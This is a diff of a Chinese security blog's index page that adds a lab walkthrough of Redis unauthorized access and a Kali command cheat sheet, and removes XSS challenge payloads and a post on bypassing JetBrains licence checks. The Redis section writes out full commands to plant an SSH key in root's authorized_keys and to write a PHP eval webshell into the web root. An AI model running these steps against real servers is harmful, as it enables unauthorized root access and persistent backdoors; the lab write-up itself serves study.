@@ -98,6 +98,50 @@
         <div class="content-wrapper">
           <div id="content" class="content"><section id="posts" class="posts"><article class="post">
     <header class="post-header">
+      <h1 class="post-title"><a class="post-link" href="/2021/03/29/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">redis未授权访问</a>
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2021-03-29
+        </span><span class="post-category">
+            <a href="/categories/Redis/">Redis</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-content"><h3 id="redis的安装"><a href="#redis的安装" class="headerlink" title="#redis的安装"></a>#redis的安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.11.tar.gz &#x2F;&#x2F;下载redis</span><br><span class="line">tar zxvf redis-3.2.11.tar.gz &#x2F;&#x2F;解压</span><br><span class="line">cd redis-3.2.11</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">cp redis.conf &#x2F;etc&#x2F;</span><br><span class="line">cd &#x2F;src&#x2F;</span><br><span class="line">cp redis-server &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">cp redis-cli &#x2F;use&#x2F;bin&#x2F;</span><br><span class="line">cd ..&#x2F;</span><br><span class="line">vim &#x2F;etc&#x2F;redis.conf</span><br><span class="line">redis-server &#x2F;etc&#x2F;redis.conf</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-272.png" alt="upload successful"><br><img src="/images/pasted-273.png" alt="upload successful"><br>*报错1：gcc：命令未找到<br>yum install gcc-c++<br>*报错2：You need tcl 8.5 or newer in order to run the Redis test<br>wget <a href="http://downloads.sourceforge.net/tcl/tcl8.6.1-src.tar.gz" target="_blank" rel="noopener">http://downloads.sourceforge.net/tcl/tcl8.6.1-src.tar.gz</a><br>sudo tar xzvf tcl8.6.1-src.tar.gz -C /usr/local/<br>cd /usr/local/tcl8.6.1/unix/<br>sudo ./configure<br>sudo make<br>sudo make install<br>*报错3：致命错误：jemalloc/jemalloc.h：没有那个文件或目录<br>make MALLOC=libc</p>
+<h3 id="验证未授权访问"><a href="#验证未授权访问" class="headerlink" title="#验证未授权访问"></a>#验证未授权访问</h3><h4 id="写入ssh公钥，获取操作系统权限"><a href="#写入ssh公钥，获取操作系统权限" class="headerlink" title="#写入ssh公钥，获取操作系统权限"></a>#写入ssh公钥，获取操作系统权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ifconfig</span><br><span class="line">cd redis-3.2.11</span><br><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">cd redis-3.2.11</span><br><span class="line">redis-cli -h 靶机地址</span><br><span class="line">keys * &#x2F;&#x2F;返回（empty list or set)</span><br><span class="line">exit</span><br><span class="line">ssh root@靶机地址 &#x2F;&#x2F;提示需要密码</span><br><span class="line">Ctrl+C 退出</span><br><span class="line">ssh-keygen -t rsa &#x2F;&#x2F;生成ssh公钥</span><br><span class="line">cd &#x2F;root&#x2F;.ssh</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;)&gt;key.txt &#x2F;&#x2F;公钥写入key.txt文件</span><br><span class="line">cp key.txt &#x2F;redis-3.2.11&#x2F;</span><br><span class="line">cd &#x2F;redis-3.2.11&#x2F;</span><br><span class="line">cat key.txt|redis-cli -h 靶机地址 -x set crack &#x2F;&#x2F;写入文件</span><br><span class="line">redis-cli -h 靶机地址 &#x2F;&#x2F;远程登陆靶机redis服务</span><br><span class="line">get crack</span><br><span class="line">config get dir</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh &#x2F;&#x2F;切换redis数据文件保存目录为.ssh</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot; &#x2F;&#x2F;设置上传公钥的备份文件名字为authorized_keys</span><br><span class="line">save</span><br><span class="line">exit</span><br><span class="line">ssh root@靶机地址</span><br><span class="line">成功登陆</span><br></pre></td></tr></table></figure>
+<p>*报错1：No route to host<br>靶机设置：<br>firewall-cmd –query-port=6379/tcp //查看6379端口是否对外开放<br>firewall-cmd –add-port=6379/tcp –permanent //开放6379端口<br>systemctl status firewalld //重启防火墙<br>firewall-cmd –list-ports //查看开放端口</p>
+<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="#写入webshell"></a>#写入webshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">yum update httpd</span><br><span class="line">yum install httpd</span><br><span class="line">systemctl start httpd</span><br><span class="line">firewall-cmd --add-port&#x3D;80&#x2F;tcp --permanent &#x2F;&#x2F;开放80端口</span><br><span class="line">systemctl status firewalld &#x2F;&#x2F;重启防火墙</span><br><span class="line">浏览器访问对应靶机地址，显示该界面</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-271.png" alt="upload successful"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">redis-cli -h 靶机地址</span><br><span class="line">config set dir &#x2F;vat&#x2F;www&#x2F;html</span><br><span class="line">set xxx &quot;\n\n&lt;?php @eval($_POST[&#39;salt&#39;]);?&gt;\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php</span><br><span class="line">save</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+        </div></article>
+      <article class="post">
+    <header class="post-header">
+      <h1 class="post-title"><a class="post-link" href="/2021/03/29/kali%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4/">kali常见指令</a>
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2021-03-29
+        </span><span class="post-category">
+            <a href="/categories/Kali/">Kali</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-content"><h3 id="KALI常见指令"><a href="#KALI常见指令" class="headerlink" title="#KALI常见指令"></a>#KALI常见指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ps aux &#x2F;&#x2F;查看进程</span><br><span class="line">ps aux|grep [nginx] &#x2F;&#x2F;查看nginx进程</span><br><span class="line">ps -u [root] &#x2F;&#x2F;查看root用户进程</span><br><span class="line">#案例</span><br><span class="line">ps aux|grep 30504</span><br><span class="line">ls -lh &#x2F;proc&#x2F;30504</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">top &#x2F;&#x2F;查看实时进程 P:以cup占用降序排序 M：以内存占用降序排序 C:完整命令内容</span><br><span class="line">netstat -anp &#x2F;&#x2F;端口占用信息</span><br><span class="line">netstat -anpt &#x2F;&#x2F;只查看tcp端口信息</span><br><span class="line">uname -a &#x2F;&#x2F;查看当前操作的Linux内核</span><br><span class="line">lsb_release -a &#x2F;&#x2F;查看发行版本</span><br><span class="line">cat head tail &#x2F;&#x2F;查看文件全部&amp;头部&amp;尾部 -n参数指定输出行数</span><br><span class="line">tail -f auth.log &#x2F;&#x2F;实时地输出最新的日志</span><br><span class="line">ls &#x2F;var&#x2F;log &#x2F;&#x2F;查看日志目录</span><br><span class="line">crontab -l &#x2F;&#x2F;列表系统的计划任务</span><br><span class="line">crontab -e &#x2F;&#x2F;进入编辑模式</span><br><span class="line">crontab -u root -e &#x2F;&#x2F;查看特定用户的计划任务</span><br><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;[root] &#x2F;&#x2F;查看不同用户的计划任务</span><br><span class="line">history &#x2F;&#x2F;历史命令操作记录</span><br><span class="line">cat ~&#x2F;.bash_history &#x2F;&#x2F;查看命令操作历史                                      </span><br><span class="line">lastlog &#x2F;&#x2F;最后登录信息</span><br><span class="line">*last -f&#x2F;var&#x2F;log&#x2F;wtmp &#x2F;&#x2F;历史用户登录信息</span><br><span class="line">find . -name &quot;*.txt&quot; &#x2F;&#x2F;当前目录查找txt文件</span><br><span class="line"></span><br><span class="line">#查找时间范围内修改文件</span><br><span class="line">touch -t time1 t_start &#x2F;&#x2F;touch：生成空文件</span><br><span class="line">touch -t time2 t_end</span><br><span class="line">find . -type f -newer t_start ! -newer t_end &#x2F;&#x2F;查找时间段内修改的文件</span><br></pre></td></tr></table></figure>
+<h3 id="KALI部署网站"><a href="#KALI部署网站" class="headerlink" title="#KALI部署网站"></a>#KALI部署网站</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#目录信息：</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;             配置文件夹</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;        默认显示页面路径</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;nginx&#x2F;            模块依赖路径</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;nginx&#x2F;        可执行文件</span><br><span class="line"></span><br><span class="line">#操作命令</span><br><span class="line">php -v &#x2F;&#x2F;返回php版本7.4.15</span><br><span class="line">apt install php7.4-fpm</span><br><span class="line">vim &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-267.png" alt="upload successful"><br><img src="/images/pasted-268.png" alt="upload successful"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nginx -t</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">vim 1.php</span><br><span class="line">&lt;?PHP phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>访问127.0.0.1/1.php<br><img src="/images/pasted-269.png" alt="upload successful"></p>
+
+        </div></article>
+      <article class="post">
+    <header class="post-header">
       <h1 class="post-title"><a class="post-link" href="/2021/02/11/XSS-challenge-tour/">XSS-challenge-tour</a>
         </h1>
 
@@ -112,15 +156,9 @@
 
     <div class="post-content"><h3 id="level1"><a href="#level1" class="headerlink" title="#level1"></a>#level1</h3><p><img src="/images/pasted-256.png" alt="upload successful"><br>payload:<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 <h3 id="level2"><a href="#level2" class="headerlink" title="#level2"></a>#level2</h3><p><img src="/images/pasted-257.png" alt="upload successful"><br>payload:<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="#level3"></a>#level3</h3><p><img src="/images/pasted-258.png" alt="upload successful"><br>payload:<code>&#39; onmouseover=&#39;alert(1)</code></p>
-<h3 id="level4"><a href="#level4" class="headerlink" title="#level4"></a>#level4</h3><p><img src="/images/pasted-259.png" alt="upload successful"><br>payload:<code>&quot;onmouseover=&quot;alert(1)</code></p>
-<h3 id="level5"><a href="#level5" class="headerlink" title="#level5"></a>#level5</h3><p><img src="/images/pasted-260.png" alt="upload successful"><br>payload:<code>xxx&quot;&gt;&lt;a href=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;link&lt;/a&gt;</code></p>
-<h3 id="level6"><a href="#level6" class="headerlink" title="#level6"></a>#level6</h3><p><img src="/images/pasted-261.png" alt="upload successful"><br>payload:<code>111&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p>
-<h3 id="level7"><a href="#level7" class="headerlink" title="#level7"></a>#level7</h3><p><img src="/images/pasted-263.png" alt="upload successful"><br>payload:<code>xx&quot; oonnmouseover=&quot;alert(1)</code></p>
-<h3 id="level8"><a href="#level8" class="headerlink" title="#level8"></a>#level8</h3><p><img src="/images/pasted-264.png" alt="upload successful"><br>payload:<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
-<h3 id="level9"><a href="#level9" class="headerlink" title="#level9"></a>#level9</h3><p><img src="/images/pasted-265.png" alt="upload successful"><br>payload:<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</code></p>
-<h3 id="level10"><a href="#level10" class="headerlink" title="#level10"></a>#level10</h3><p><img src="/images/pasted-266.png" alt="upload successful"><br>payload:<code>?t_sort=&quot; onclick=&quot;alert(1)&quot; type=</code></p>
-
+          <div class="read-more">
+            <a href="/2021/02/11/XSS-challenge-tour/" class="read-more-link">Read more..</a>
+          </div>
         </div></article>
       <article class="post">
     <header class="post-header">
@@ -255,44 +293,6 @@
     <div class="post-content"><h3 id="主机探测"><a href="#主机探测" class="headerlink" title="#主机探测"></a>#主机探测</h3><p>1.1 ping检查主机是否在线<br>例：<code>ping -c 5 -s 2000 192.168.1.3</code> 发送五个大小为2000的字节包到目标主机<br>1.2 arping测试特定IP在网络中是否在线<br>例：<code>arping -c 5 192.168.1.3</code>发送四个ping数据包到目标主机</p>
           <div class="read-more">
             <a href="/2020/02/04/Kali%E5%85%A5%E9%97%A8/" class="read-more-link">Read more..</a>
-          </div>
-        </div></article>
-      <article class="post">
-    <header class="post-header">
-      <h1 class="post-title"><a class="post-link" href="/2020/02/04/Pycharm-Phpstorm%E6%B3%A8%E5%86%8C%E7%A0%81/">Pycharm/Phpstorm注册码</a>
-        </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2020-02-04
-        </span><span class="post-category">
-            <a href="/categories/%E6%95%99%E7%A8%8B/">教程</a>
-            </span>
-        </div>
-    </header>
-
-    <div class="post-content"><h3 id="学生邮箱注册认证后可以免费使用一年"><a href="#学生邮箱注册认证后可以免费使用一年" class="headerlink" title="#学生邮箱注册认证后可以免费使用一年"></a>#学生邮箱注册认证后可以免费使用一年</h3><h3 id="注册码"><a href="#注册码" class="headerlink" title="#注册码"></a>#注册码</h3><p>访问网站[<a href="http://idea.lanyus.com/]复制注册码" target="_blank" rel="noopener">http://idea.lanyus.com/]复制注册码</a><br>将“0.0.0.0 account.jetbrains.com”添加到hosts文件中</p>
-          <div class="read-more">
-            <a href="/2020/02/04/Pycharm-Phpstorm%E6%B3%A8%E5%86%8C%E7%A0%81/" class="read-more-link">Read more..</a>
-          </div>
-        </div></article>
-      <article class="post">
-    <header class="post-header">
-      <h1 class="post-title"><a class="post-link" href="/2020/02/03/Python-4/">Python(4)</a>
-        </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2020-02-03
-        </span><span class="post-category">
-            <a href="/categories/Python/">Python</a>
-            </span>
-        </div>
-    </header>
-
-    <div class="post-content"><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="#常用函数"></a>#常用函数</h3><p>*字符显示格式<br>title():以首字母大写的形式显示单词<br>upper():字符串全部大写<br>lower():字符串全部小写</p>
-          <div class="read-more">
-            <a href="/2020/02/03/Python-4/" class="read-more-link">Read more..</a>
           </div>
         </div></article>
       <nav class="pagination"><a class="next" href="/page/2/">
